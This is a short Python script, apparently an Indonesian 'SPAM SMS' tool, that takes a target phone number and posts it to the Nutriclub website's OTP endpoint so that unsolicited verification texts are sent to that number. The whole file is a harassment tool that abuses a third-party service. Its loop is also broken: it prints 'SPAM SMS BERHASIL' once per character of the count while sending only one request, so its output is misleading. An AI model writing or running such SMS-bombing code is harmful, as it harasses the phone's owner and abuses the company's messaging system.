import json,os,sys
import requests as rek



banner="""
[*]____________________________[*]
 |                              |
 |     	  SPAM SMS              |
 |        Nutri club            |
 |	AWALI :8xxxxx           |
 |______________________________|
"""
os.system("clear")
print(banner)
target = input("Nomor target : ")
jl = input("[+] jumlah : ")



api_url = "https://www.nutriclub.co.id/otp/?phone=0"+target+"&old_phone=0"+target


headers = {
"conection":"keep-alive",
"user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; CPH1853) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
}

respon = rek.post(api_url,headers).text

status =json.loads(respon)["StatusMessage"]
for i in str(jl):
	 print ("SPAM SMS BERHASIL")




